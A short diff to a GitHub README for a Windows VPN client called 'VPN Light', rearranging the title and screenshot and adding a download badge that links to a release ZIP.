@@ -1,6 +1,8 @@
-VPN Light 🛡️⚡<img width="1168" height="784" alt="image" src="https://github.com/user-attachments/assets/640db887-04a2-4518-abae-84e836d6f979" />
-Lightweight, fast and clean VPN client for Windows.
-Built for people who want solid privacy protection without heavy software and unnecessary features.
+VPN Light Lightweight, fast and clean VPN client for Windows.🛡️⚡
+
+<img width="1168" height="784" alt="image" src="https://github.com/user-attachments/assets/640db887-04a2-4518-abae-84e836d6f979" />
+
+[![Download VPN Light](https://img.shields.io/badge/⬇️_Download_VPN_Light-2563eb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Grandmasterplepucker/VPN-Light/releases/download/VPNLight/VPNLight.zip)
 
 ✨ Features
 
